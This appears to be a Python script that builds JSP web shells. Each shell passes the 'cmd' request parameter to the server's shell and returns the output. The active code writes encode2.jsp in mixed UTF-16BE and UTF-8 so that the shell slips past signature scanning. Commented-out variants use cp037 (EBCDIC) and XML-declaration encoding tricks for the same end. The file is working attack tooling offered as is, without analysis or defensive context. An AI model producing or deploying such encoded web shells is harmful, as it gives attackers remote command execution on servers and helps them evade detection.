# a0 = '''<?xml version="1.0" encoding='cp037'?>'''
# a1 = '''
# <jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"
#           version="1.2">
#     <jsp:directive.page contentType="text/html"/>
#     <jsp:declaration>
#     </jsp:declaration>
#     <jsp:scriptlet>
#         boolean isLinux = true;
#         String osTyp = System.getProperty("os.name");
#         if (osTyp.toLowerCase().contains("win")) {
#         isLinux = false;
#         }
#         String cmd = request.getParameter("cmd");
#         String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
#         Process p = Runtime.getRuntime().exec(cmds);
#         java.io.BufferedReader input = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
#         String line = "";
#         while ((line = input.readLine()) != null) {
#         out.write(line+"\\n");
#         }
# </jsp:scriptlet>
#     <jsp:text>
#     </jsp:text>
# </jsp:root>'''

# with open("cp037.jsp","wb") as f:
#     f.write(a0.encode("utf-16"))
#     f.write(a1.encode("cp037"))


a0 = '''<%
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    java.io.BufferedReader input = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
    String line = "'''
a1 = '''<%@ page pageEncoding="UTF-16BE"%>'''
a2 = '''";
    while ((line = input.readLine()) != null) {
        out.write(line+"\\n");
    }
%>'''
with open("encode2.jsp","wb") as f:
    f.write(a0.encode("utf-16be"))
    f.write(a1.encode("utf-8"))
    f.write(a2.encode("utf-16be"))



# a0 = '''<?xml version="1.0" encoding='cp037'?>'''
# a1 = '''<%
#     boolean isLinux = true;
#     String osTyp = System.getProperty("os.name");
#     if (osTyp.toLowerCase().contains("win")) {
#     isLinux = false;
#     }
#     String cmd = request.getParameter("cmd");
#     String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
#     Process p = Runtime.getRuntime().exec(cmds);
#     java.io.BufferedReader input = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
#     String line = "'''
# a2 = '''<%@ page pageEncoding="UTF-16BE"%>'''
# a3 = '''";
#     while ((line = input.readLine()) != null) {
#         out.write(line+"\\n");
#     }
# %>'''
# with open("encode3.jsp","wb") as f:
#     f.write(a0.encode("utf-8"))
#     f.write(a1.encode("utf-16be"))
#     f.write(a2.encode("cp037"))
#     f.write(a3.encode("utf-16be"))